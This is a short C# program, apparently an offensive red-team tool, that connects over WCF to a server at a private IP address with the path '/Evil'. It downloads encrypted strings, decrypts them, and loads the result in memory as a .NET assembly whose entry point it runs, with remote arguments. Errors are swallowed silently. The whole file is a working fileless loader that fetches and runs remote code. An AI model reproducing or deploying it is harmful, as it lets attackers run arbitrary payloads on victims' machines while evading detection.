using System;
using System.ServiceModel;
using System.Reflection;
using System.IO;
using System.Linq;
using System.Collections.Generic;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    static void Main(string[] args)
    {
         try
         {
            var binding = new BasicHttpBinding();
            binding.MaxReceivedMessageSize = Int32.MaxValue;
            var channel = new ChannelFactory<Interface2>(binding, "http://192.168.55.250:8080/Evil");
            var client = channel.CreateChannel();

            //Return source from server
            List<string> source = new List<string>();
            String[] source1 = client.b64AssemblyEncryptString();
            

            foreach (string item in source1)
            {
                try
                {
                string decryptedstring = StringCipher.Decrypt(item, source1[1]);
                source.Add(decryptedstring);
                }
                catch
                { }
            }
            
            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);

            //Args
            object[] cmd = source.Skip(1).ToArray(); ;

            //Read the bytes from the binary file
            MemoryStream ms = new MemoryStream(decode);
            BinaryReader br = new BinaryReader(ms);
            byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
            ms.Close();
            br.Close();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { cmd });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
         }
         catch
         { }
    }
}

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] b64AssemblyEncryptString();
}
